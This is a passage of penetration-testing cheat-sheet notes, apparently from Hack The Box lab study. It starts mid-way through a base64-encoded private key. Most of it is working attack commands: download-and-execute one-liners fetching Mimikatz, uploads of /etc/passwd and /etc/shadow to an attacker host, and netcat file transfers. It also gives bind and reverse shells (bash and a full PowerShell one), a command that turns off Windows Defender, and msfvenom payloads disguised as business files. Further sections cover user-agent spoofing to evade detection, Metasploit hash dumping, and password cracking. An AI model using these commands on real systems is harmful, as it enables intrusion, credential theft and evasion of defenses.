mIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=")) --> Decode base64 (Windows)Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 --> MD5 Hash Check (Windows)PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1') --> Windows file downloadPS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') --> Run Downloaded ScriptPS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX --> Run Downloaded ScriptInvoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1 --> Invoke web request: can use iwr, curl and wgetcurl.exe --output index.html --url https://superuser.com --> Curl dow download a file in windows CMDsudo impacket-smbserver share -smb2support /tmp/smbshare --> Create SMB Serversudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test --> Create SMB Server with Username and Passwordcopy \192.168.220.133\share\nc.exe --> Copy file from SMB Serversudo pip3 install pyftpdlib --> Installing the FTP Server Python3 Module - pyftpdlibsudo python3 -m pyftpdlib --port 21 --> Setting up a Python3 FTP Server[I 2022-05-17 10:09:19] concurrency model: async[I 2022-05-17 10:09:19] masquerade (NAT) address: None[I 2022-05-17 10:09:19] passive ports: None[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt') --> Transferring Files from an FTP Server Using PowerShellC:\htb> echo open 192.168.49.128 > ftpcommand.txt --> Create a Command File for the FTP Client and Download the Target FileC:\htb> echo USER anonymous >> ftpcommand.txtC:\htb> echo binary >> ftpcommand.txtC:\htb> echo GET file.txt >> ftpcommand.txtC:\htb> echo bye >> ftpcommand.txtC:\htb> ftp -v -n -s:ftpcommand.txtftp> open 192.168.49.128Log in with USER and PASS first.ftp> USER anonymousftp> GET file.txtftp> byeC:\htb>more file.txtThis is a test filepip3 install uploadserver --> Installing a Configured WebServer with Uploadpython3 -m uploadserverPS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts --> PowerShell Script to Upload a File to Python Upload ServerPS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)) --> PowerShell Base64 Web UploadPS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64exec 3<>/dev/tcp/10.10.10.32/80 --> Connecting to Target Webeserver (Linux)echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3 --> HTTP GET Request (Linux)cat <&3 --> Print responsesudo systemctl enable ssh --> Enabling SSH serversudo systemctl start ssh --> Starting SSH serverscp plaintext@192.168.49.128:/root/myroot.txt .  --> Downloading files with SCPsudo python3 -m pip install --user uploadserver --> Start webseveropenssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' --> Creating Self Signed ceertificatemkdir https && cd httpssudo python3 -m uploadserver 443 --server-certificate ~/server.pemcurl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure --> Upload multiple filespython3 -m http.server --> Python web serverphp -S 0.0.0.0:8000 --> PHP web serverruby -run -ehttpd . -p8000 --> Ruby web serverscp /etc/passwd htb-student@10.129.86.90:/home/htb-student/ --> SCP Uploadimport urllib.request as requestrequest.urlretrieve("http://STMIP/flag.txt", "flag.txt"); --> Python download scriptimport zipfilewith zipfile.ZipFile('test.zip', "r") as z:  z.extractall("/home/user/directory") --> Python to unzip a .zip (Use if unzip not installed and no sudoers perms to install it)python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")' --> Downloading files with python 2python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")' --> Downloading files with python 3php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);' --> Downloading file with PHPphp -r 'const BUFFER = 1024; $fremote =fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);' --> Open URL / Read contents / Save to file with PHPphp -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash --> Download a file and pipe it to bash with PHPruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))' --> Ruby download a fileperl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");' --> Perl download a filevar WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type = 1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(WScript.Arguments(1)); --> JavaScript download a filecscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1 --> Download a file using JavaScript and cscript.exedim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")dim bStrm: Set bStrm = createobject("Adodb.Stream")xHttp.Open "GET", WScript.Arguments.Item(0), FalsexHttp.Sendwith bStrm    .type = 1    .open    .write xHttp.responseBody    .savetofile WScript.Arguments.Item(1), 2end with --> Download a file using VBScriptC:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1 --> Download a file using VBScript and cscript.exepython3 -m uploadserver --> Create python upload serverpython3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})' --> Upload a file using Python One-Linernc -l -p 8000 > SharpKatz.exe --> Listener into filencat -l -p 8000 --recv-only > SharpKatz.exe --> Listener into file if using Ncatnc -q 0 192.168.49.128 8000 < SharpKatz.exe --> Send a file to compromised machinencat --send-only 192.168.49.128 8000 < SharpKatz.exe --> Send a file to compromised machine if using Ncatsudo nc -l -p 443 -q 0 < SharpKatz.exe --> Sending a file as input into netcatnc 192.168.49.128 443 > SharpKatz.exe --> Compromised machine to receive a filesudo ncat -l -p 443 --send-only < SharpKatz.exe Sending a file as input into Ncatncat 192.168.49.128 443 --recv-only > SharpKatz.exe --> Compromised Machine Connect to Ncat to Receive the Filesudo nc -l -p 443 -q 0 < SharpKatz.exe --> NetCat - Sending File as Input to Netcatsudo ncat -l -p 443 --send-only < SharpKatz.exe -->  - Sending File as Input to Ncatcat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe --> Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File$Session = New-PSSession -ComputerName DATABASE01 --> Create a PowerShell Remoting Session to DATABASE01PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\ --> Copy samplefile.txt from our Localhost to the DATABASE01 SessionPS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session --> PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Sessionrdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files' --> Mounting a Linux Folder Using rdesktopxfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer --> Mounting a Linux Folder Using xfreerdp---.EXAMPLEInvoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"Description---Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext. .EXAMPLEInvoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" Description---Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text. .EXAMPLEInvoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin Description---Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes" .EXAMPLEInvoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes Description---Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"#>function Invoke-AESEncryption {    [CmdletBinding()]    [OutputType([string])]    Param    (        [Parameter(Mandatory = $true)]        [ValidateSet('Encrypt', 'Decrypt')]        [String]$Mode,        [Parameter(Mandatory = $true)]        [String]$Key,        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]        [String]$Text,        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]        [String]$Path    )    Begin {        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed        $aesManaged = New-Object System.Security.Cryptography.AesManaged        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros        $aesManaged.BlockSize = 128        $aesManaged.KeySize = 256    }    Process {        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))        switch ($Mode) {            'Encrypt' {                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}                 if ($Path) {                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue                    if (!$File.FullName) {                        Write-Error -Message "File not found!"                        break                    }                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)                    $outPath = $File.FullName + ".aes"                }                $encryptor = $aesManaged.CreateEncryptor()                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)                $encryptedBytes = $aesManaged.IV + $encryptedBytes                $aesManaged.Dispose()                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}                 if ($Path) {                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime                    return "File encrypted to $outPath"                }            }            'Decrypt' {                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}                 if ($Path) {                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue                    if (!$File.FullName) {                        Write-Error -Message "File not found!"                        break                    }                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)                    $outPath = $File.FullName -replace ".aes"                }                $aesManaged.IV = $cipherBytes[0..15]                $decryptor = $aesManaged.CreateDecryptor()                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)                $aesManaged.Dispose()                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}                 if ($Path) {                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime                    return "File decrypted to $outPath"                }            }        }    }    End {        $shaManaged.Dispose()        $aesManaged.Dispose()    }}Import-Module .\Invoke-AESEncryption.ps1 --> Import Module Invoke-AESEncryption.ps1Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt --> File Encryption Exampleopenssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc -->  Encrypting /etc/passwd with openssl (Linux)openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd --> Decrypt passwd.enc with openssl---Living Off the Land:https://lolbas-project.github.io/# --> LOL for Windowshttps://gtfobins.github.io/ --> LOL for Linuxcertreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.iniCertificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT) --> Upload win.ini from target to attackersudo nc -lvnp 8000 --> Listener to receive fileopenssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem --> Create certificate on attacker machineopenssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh --> Stand up the Server in attacker machineopenssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh --> Download file from target machinebitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe --> File download with Bitsadmin (LOL)Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe" --> Download (LOL)certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe --> Download a file with Certutil (LOL)---Changing user agents to avoid detection:Listing User Agents:PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | flName       : InternetExplorerUser Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)Name       : FireFoxUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0Name       : ChromeUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0             Safari/534.6Name       : OperaUser Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1Name       : SafariUser Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0             Safari/533.16PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::ChromePS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe" --> Request with Chrome User AgentGfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe" --> Transfering files with GfxDownloadWrapper.exe---nc -lvnp 7777 --> Starting Netcat listenerrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f --> Server - Binding a Bash shell to the TCP session (Bind Shell)nc -nv 10.129.41.200 7777 --> Connect to listenerpowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" --> Reverse shell windowsSet-MpPreference -DisableRealtimeMonitoring $true --> Disable AVrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f --> Netcat/Bash Reverse---msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf --> Stageless payloadmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe --> Stageless payload for windows/usr/share/metasploit-framework/modules/exploits --> Metasploit payload location, can add exploits here if necessarypython -c 'import pty; pty.spawn("/bin/sh")'  --> Spawn interactive python shell/bin/sh -i --> Spawn interactive shellperl —e 'exec "/bin/sh";' --> Spawn interactive perl shellperl: exec "/bin/sh";ruby: exec "/bin/sh" --> Spawn interactive ruby shelllua: os.execute('/bin/sh') --> Spawn interactive Lua shellawk 'BEGIN {system("/bin/sh")}' --> Spawn interactive AWK Shellfind / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \; --> Spwan interactive find shellfind . -exec /bin/sh \; -quitmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.129.204.126 LPORT=4444 -f war -o shell.war --> Jsp reverse shell for apache tomcat vuln--ls /usr/share/metasploit-framework/modules --> Metasploit modules locationls /usr/share/metasploit-framework/plugins/ --> Metasploit plugins locationls /usr/share/metasploit-framework/scripts/ --> Meterpreter scripts locationls /usr/share/metasploit-framework/tools/ --> Commandline toolssudo apt update && sudo apt install metasploit-framework --> Installing metasploitmsfconsole --> Launching metasploitModule Types:Type	DescriptionAuxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.Encoders	Ensure that payloads are intact to their destination.Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.NOPs	(No Operation code) Keep the payload sizes consistent across exploit attempts.Payloads	Code runs remotely and calls back to the attacker machine to establish a connection (or shell).Plugins	Additional scripts can be integrated within an assessment with msfconsole and coexist.Post	Wide array of modules to gather information, pivot deeper, etc.search <term1>, <term2> --> Search modulessearch <term> type:exploit --> Search modules of type exploituse 0 --> Selecting module 0 from searchinfo --> Module informationshow options --> Show options to setset RHOSTS --> Target Specificationshow targets --> Shpw targets (OS versions / system identifiers) which are vulnerable to the selected moduleset target <index no.>  --> set target index number if we know what versions are running on the target (Automatic/0 by default)show payloads --> Serarch for Staged Payloads.grep meterpreter show payloads --> Searching for specific Payloadsgrep meterpreter grep reverse_tcp show payloadsset payload 15 --> Selecting payloads after 'show payloads'msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl --> Gereating a payload without encodingmsfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai --> Generating a paylod with encodingshow encoders --> List Encodersmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe --> encode multiple iterationssudo service postgresql status --> Setting up PostgreSQL Databasesudo systemctl start postgresql --> Start Databasesudo msfdb init --> Initiate Database in MSFsudo msfdb run --> Connect to initiated databasemsfdb reinit --> Reinitiate the Databasecp /usr/share/metasploit-framework/config/database.yml ~/.msf4/sudo service postgresql restartmsfconsole -qworkspaceworkspace -a Target_1 --> Create a workspacecat Target.nmapdb_import Target.xml --> Import scan resultshosts --> Show hostsservices --> Show servicesdb_nmap -sV -sS 10.10.10.8 --> Using nmap Inside MSFconsoledb_export -h --> Backup / Export Databasecreds -h --> MSF stored credentialsloot -h --> List of owned services and usersload nessus --> Load plugins (Nessus in this case)git clone https://github.com/darkoperator/Metasploit-Plugins --> Loading plugins (pentest in this case)ls Metasploit-Pluginssudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rbmsfconsoleload pentestsessions --> List active sessionssessions -i 1 --> interacrting with a session (1 in this case)background --> put a session into the backgroundjobs -h. --> Viewing jobs help menu (Jobs are active exploits etc. Used to close them to ensure port closes properly inst for just doing ctrl + c)exploit -j --> Running exploit in the backgroundjobs -l --> List running jobsmeterpreter > hashdump --> meterpreter hashdumpmeterpreter > lsa_dump_sam -> meterpreter LSA hasdumpmeterpreter > lsa_dump_secrets --> meterpreter LSA Secrets Dumphttps://www.exploit-db.com/ --> Good for MSF exploit scripts, use Metasploit Framework (MSF) tag for scripts whicha re avaliable in Metasploit module formatsearchsploit <exploit> Use searchsploit for exploit scriptscp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb --> load exploit into metasploitmsfconsole -m /usr/share/metasploit-framework/modules/msf6> loadpath /usr/share/metasploit-framework/modules/msf6 > reload_all --> Reload to make sure new exploit appears in listhttps://academy.hackthebox.com/module/39/section/417 --> for more info on custom scripts--echo -n Soccer06! | md5sum --> MD5 Hashecho -n Soccer06! | sha256sum --> Sha256 Hashhttps://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt --> Rockyou.txt password listhttps://github.com/danielmiessler/SecLists --> Seclist Github Wordlistsjohn --single passwd --> John The Ripperjohn --wordlist=<wordlist_file> <hash_file> --> John Wordlist Modejohn --incremental <hash_file> --> John Incremental modehashid -j 193069ceb0461e1d40d216e32c79c704 --> Identifying hash formats with JohnJTR Fromats:Hash format	Example command	Descriptionafs	john --format=afs [...] <hash_file>	AFS (Andrew File System) password hashesbfegg	john --format=bfegg [...] <hash_file>	bfegg hashes used in Eggdrop IRC botsbf	john --format=bf [...] <hash_file>	Blowfish-based crypt(3) hashesbsdi	john --format=bsdi [...] <hash_file>	BSDi crypt(3) hashescrypt(3)	john --format=crypt [...] <hash_file>	Traditional Unix crypt(3) hashesdes	john --format=des [...] <hash_file>	Traditional DES-based crypt(3) hashesdmd5	john --format=dmd5 [...] <hash_file>	DMD5 (Dragonfly BSD MD5) password hashesdominosec	john --format=dominosec [...] <hash_file>	IBM Lotus Domino 6/7 password hashesEPiServer SID hashes	john --format=episerver [...] <hash_file>	EPiServer SID (Security Identifier) password hasheshdaa	john --format=hdaa [...] <hash_file>	hdaa password hashes used in Openwall GNU/Linuxhmac-md5	john --format=hmac-md5 [...] <hash_file>	hmac-md5 password hasheshmailserver	john --format=hmailserver [...] <hash_file>	hmailserver password hashesipb2	john --format=ipb2 [...] <hash_file>	Invision Power Board 2 password hasheskrb4	john --format=krb4 [...] <hash_file>	Kerberos 4 password hasheskrb5	john --format=krb5 [...] <hash_file>	Kerberos 5 password hashesLM	john --format=LM [...] <hash_file>	LM (Lan Manager) password hasheslotus5	john --format=lotus5 [...] <hash_file>	Lotus Notes/Domino 5 password hashesmscash	john --format=mscash [...] <hash_file>	MS Cache password hashesmscash2	john --format=mscash2 [...] <hash_file>	MS Cache v2 password hashesmschapv2	john --format=mschapv2 [...] <hash_file>	MS CHAP v2 password hashesmskrb5	john --format=mskrb5 [...] <hash_file>	MS Kerberos 5 password hashesmssql05	john --format=mssql05 [...] <hash_file>	MS SQL 2005 password hashesmssql	john --format=mssql [...] <hash_file>	MS SQL password hashesmysql-fast	john --format=mysql-fast [...] <hash_file>	MySQL fast password hashesmysql	john --format=mysql [...] <hash_file>	MySQL password hashesmysql-sha1	john --format=mysql-sha1 [...] <hash_file>	MySQL SHA1 password hashesNETLM	john --format=netlm [...] <hash_file>	NETLM (NT LAN Manager) password hashesNETLMv2	john --format=netlmv2 [...] <hash_file>	NETLMv2 (NT LAN Manager version 2) password hashesNETNTLM	john --format=netntlm [...] <hash_file>	NETNTLM (NT LAN Manager) password hashesNETNTLMv2	john --format=netntlmv2 [...] <hash_file>	NETNTLMv2 (NT LAN Manager version 2) password hashesNEThalfLM	john --format=nethalflm [...] <hash_file>	NEThalfLM (NT LAN Manager) password hashesmd5ns	john --format=md5ns [...] <hash_file>	md5ns (MD5 namespace) password hashesnsldap	john --format=nsldap [...] <hash_file>	nsldap (OpenLDAP SHA) password hashesssha	john --format=ssha [...] <hash_file>	ssha (Salted SHA) password hashesNT	john --format=nt [...] <hash_file>	NT (Windows NT) password hashesopenssha	john --format=openssha [...] <hash_file>	OPENSSH private key password hashesoracle11	john --format=oracle11 [...] <hash_file>	Oracle 11 password hashesoracle	john --format=oracle [...] <hash_file>	Oracle password hashespdf	john --format=pdf [...] <hash_file>	PDF (Portable Document Format) password hashesphpass-md5	john --format=phpass-md5 [...] <hash_file>	PHPass-MD5 (Portable PHP password hashing framework) password hashesphps	john --format=phps [...] <hash_file>	PHPS password hashespix-md5	john --format=pix-md5 [...] <hash_file>	Cisco PIX MD5 password hashespo	john --format=po [...] <hash_file>	Po (Sybase SQL Anywhere) password hashesrar	john --format=rar [...] <hash_file>	RAR (WinRAR) password hashesraw-md4	john --format=raw-md4 [...] <hash_file>	Raw MD4 password hashesraw-md5	john --format=raw-md5 [...] <hash_file>	Raw MD5 password hashesraw-md5-unicode	john --format=raw-md5-unicode [...] <hash_file>	Raw MD5 Unicode password hashesraw-sha1	john --format=raw-sha1 [...] <hash_file>	Raw SHA1 password hashesraw-sha224	john --format=raw-sha224 [...] <hash_file>	Raw SHA224 password hashesraw-sha256	john --format=raw-sha256 [...] <hash_file>	Raw SHA256 password hashesraw-sha384	john --format=raw-sha384 [...] <hash_file>	Raw SHA384 password hashesraw-sha512	john --format=raw-sha512 [...] <hash_file>	Raw SHA512 password hashessalted-sha	john --format=salted-sha [...] <hash_file>	Salted SHA password hashessapb	john --format=sapb [...] <hash_file>	SAP CODVN B (BCODE) password hashessapg	john --format=sapg [...] <hash_file>	SAP CODVN G (PASSCODE) password hashessha1-gen	john --format=sha1-gen [...] <hash_file>	Generic SHA1 password hashesskey	john --format=skey [...] <hash_file>	S/Key (One-time password) hashesssh	john --format=ssh [...] <hash_file>	SSH (Secure Shell) password hashessybasease	john --format=sybasease [...] <hash_file>	Sybase ASE password hashesxsha	john --format=xsha [...] <hash_file>	xsha (Extended SHA) password hasheszip	john --format=zip [...] <hash_file>	ZIP (WinZip) password hashes<tool> <file_to_crack> > file.hash --> Process files with JtR tools to be compatible with john (Could be password protected files)JtR Tools:Tool	Descriptionpdf2john	Converts PDF documents for Johnssh2john	Converts SSH private keys for Johnmscash2john	Converts MS Cash hashes for Johnkeychain2john	Converts OS X keychain files for Johnrar2john	Converts RAR archives for Johnpfx2john	Converts PKCS#12 files for Johntruecrypt_volume2john	Converts TrueCrypt volumes for Johnkeepass2john	Converts KeePass databases for Johnvncpcap2john	Converts VNC PCAP files for Johnputty2john	Converts PuTTY private keys for Johnzip2john	Converts ZIP archives for Johnhccap2john	Converts WPA/WPA2 handshake captures for Johnoffice2john	Converts MS Office documents for Johnwpa2john	Converts WPA/WPA2 handshakes for Johnlocate *2john* --> Locate john scriptsssh2john.py SSH.private > ssh.hash --> examplejohn --wordlist=rockyou.txt ssh.hashoffice2john.py Protected.docx > protected-docx.hash --> Cracking password protected doccumentsjohn --wordlist=rockyou.txt protected-docx.hashjohn protected-docx.hash --showhashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...] --> General Hashcat Syntax: -a is used to specify the attack mode, -m is used to specify the hash type, <hashes> is a either a hash string, or a file containing one or more password hashes of the same type, and[wordlist, rule, mask, ...] is a placeholder for additional arguments that depend on the attack modehashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1' --> Idnetify Hashcat type hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt --> -a 0 --> Dictonairy attack mode, -m 0 --> MD5 hah IDhashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --> Rule based transformations"C:\Program Files (x86)\hashcat-6.2.6\rules\best64.rule" --> Path for windowshashcat -a 3 --> Mask attack, define keyspace rules e.g. 8 upper case charactershashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s' --> start with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol.Hashcat Mask Symbols:Symbol	Charset?l	abcdefghijklmnopqrstuvwxyz?u	ABCDEFGHIJKLMNOPQRSTUVWXYZ?d	0123456789?h	0123456789abcdef?H	0123456789ABCDEF?s	«space»!"#$%&'()*+,-./:;<=>?@[]^_`{?a	?l?u?d?s?b	0x00 - 0xffHashcat Rules for custom wordlistsFunction	Description:	Do nothingl	Lowercase all lettersu	Uppercase all lettersc	Capitalize the first letter and lowercase otherssXY	Replace all instances of X with Y$!	Add the exclamation character at the endhashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list --> Apply rule to each word in a password listcewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist --> CeWL to scan potntial words from website and save to listwc -l inlane.wordlistfor ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done --> Locate Encrypted filesgrep -rnE '^\-{5}BEGIN 